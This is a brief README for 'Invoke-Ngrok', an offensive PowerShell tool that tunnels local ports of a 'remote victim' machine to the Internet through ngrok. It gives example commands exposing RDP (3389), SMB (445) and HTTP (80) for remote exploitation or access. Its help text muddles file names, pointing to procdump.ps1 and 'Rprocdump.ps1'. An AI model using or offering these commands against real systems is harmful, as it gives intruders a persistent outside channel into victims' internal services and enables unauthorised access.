# INVOKE-NGROK 
 
Expose local port of a remote victim over Internet. 
Use it to exploit or access local service remotely without public IP (RDP, SQL, SSH, SMB, FTP ...)

Help:
	Edit prameters in procdump.ps1 and run Rprocdump.ps1 with same parameters:
	example:

	Invoke-Ngrok -auth xxxxxxx -protocol tcp -port 3389  #expose RDP session over Internet 
	Invoke-Ngrok -auth xxxxxxx -protocol tcp -port 445   #expose SMB port over Internet
	Invoke-Ngrok -auth xxxxxxx -protocol http -port 80   #expose HTTP port over Internet
	
Author: @ThebenyGreen
  - EyesOpenSecurity

Credits -  inconshreveable - <alan@ngrok.com> 
